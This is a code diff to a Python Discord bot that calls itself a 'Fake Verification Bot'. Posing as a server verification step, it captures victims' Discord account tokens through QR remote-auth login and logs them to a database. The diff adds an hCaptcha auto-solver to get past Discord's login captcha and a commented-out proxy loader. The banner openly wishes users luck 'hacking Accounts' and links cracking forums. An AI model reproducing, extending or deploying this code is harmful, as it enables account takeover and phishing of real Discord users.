@@ -1,5 +1,5 @@
 #Importing modules
-import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
+import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests, os
 from nextcord import ButtonStyle
 from nextcord.ext import commands
 from nextcord.ui import Button, View
@@ -14,6 +14,8 @@ from cryptography.hazmat.primitives import hashes
 from colorama import Fore, init; init(autoreset=True)
 from urllib.request import Request, urlopen
 from remoteauthclient import RemoteAuthClient
+from async_hcaptcha import AioHcaptcha
+from async_hcaptcha.utils import getUrl
 from time import sleep
 y = Fore.LIGHTYELLOW_EX
 b = Fore.LIGHTBLUE_EX
@@ -46,7 +48,7 @@ message = config.get('message')
 #Bot title
 def bot_title():
     os.system("cls" if os.name == "nt" else "clear")
-    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#0001")
+    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#1312")
     else: pass
     print("\n\n")
     print(f"""{Fore.RESET}
@@ -58,7 +60,7 @@ def bot_title():
     \t\t\t╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
                                                                                                          
     print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-    print(f"\t{Fore.LIGHTWHITE_EX}https://discord.verify.gay | https://github.com/FuckingToasters | https://cracked.io/Infinimonster | https://nulled.to/Infinimonster | Infinimonster#0001\n")
+    print(f"\t{Fore.LIGHTWHITE_EX}https://discord.verify.gay | https://github.com/FuckingToasters | https://cracked.io/Infinimonster | https://nulled.to/Infinimonster | Infinimonster#1312\n")
     print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))
 
 #Bot home page
@@ -88,12 +90,12 @@ def startprint():
     \t\t\t\t\t\t{y}[{b}+{y}]{w} Settings View:\n
     \t\t\t\t\t\t[#] Give Role:       {give_role_texte}
     \t\t\t\t\t\t[#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
-    print(f"\t\t\t\t\t\t\t\t{y}[{Fore.GREEN}!{y}]{w} Bot is now Online! Wish u luck with hacking Accounts <3")
+    print(f"\t\t\t\t\t\t{y}[{Fore.GREEN}!{y}]{w} Bot is now Online! Wish u luck with hacking Accounts <3")
 
 intents = nextcord.Intents.default()
 intents.message_content = True
 
-bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Infinimonster#0001 & Astraa#6100", intents=intents)
+bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Infinimonster#1312 & Astraa#6100", intents=intents)
 
 #Launching the Bot
 def Init():
@@ -152,9 +154,35 @@ async def start(ctx):
                 self.avatar = _avatar
         
         c = RemoteAuthClient()
+        """
+        with open("proxies.txt", "r") as f:
+            proxies = f.readlines()
+            
+        if proxies == []:
+            c = RemoteAuthClient()
+            
+        else:
+            for proxy in proxies:
+                print(proxy)
+                if ":" in proxy:
+                    proxy = proxy.split(":")
+                    
+                    try: hostname, port, username, password = proxy[0], proxy[1], proxy[2], proxy[3]
+                    
+                    except IndexError:
+                        try: hostname, port, username, password = proxy[0], proxy[1], None, None
+                        except IndexError: print("proxies are wrong formatted, please use ip:port or ip:port:username:password")
+                    
+                else:
+                    print("Proxy Need to be seperated by at least a :")
+        
+            c = RemoteAuthClient(proxy=proxy, proxy_auth={"login": username, "password": password} if username and password is not None else None)
+        """
+            
         #QR Creation, Informations sender, Role giver, Mass DM sender, ...
         @c.event("on_fingerprint")
         async def on_fingerprint(data):
+                
             @c.event("on_cancel")
             async def on_cancel():
                 print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
@@ -182,7 +210,19 @@ async def start(ctx):
     
                 json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                 print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
-    
+                
+                @c.event("on_captcha")
+                async def on_captcha(captcha_data):
+                    captcha_key = None
+                    for _ in range(3):
+                        solver = AioHcaptcha(captcha_data["captcha_sitekey"], "https://discord.com/login", {"executable_path": "driver/chromedriver.exe"})
+                        try:
+                            captcha_key = await solver.solve(custom_params={"rqdata": captcha_data["captcha_rqdata"]})
+                            break
+                        except KeyError:
+                            continue
+                    return captcha_key
+                
                 @c.event("on_token")
                 async def on_token(token):
                     if not os.path.isfile("database.json"):
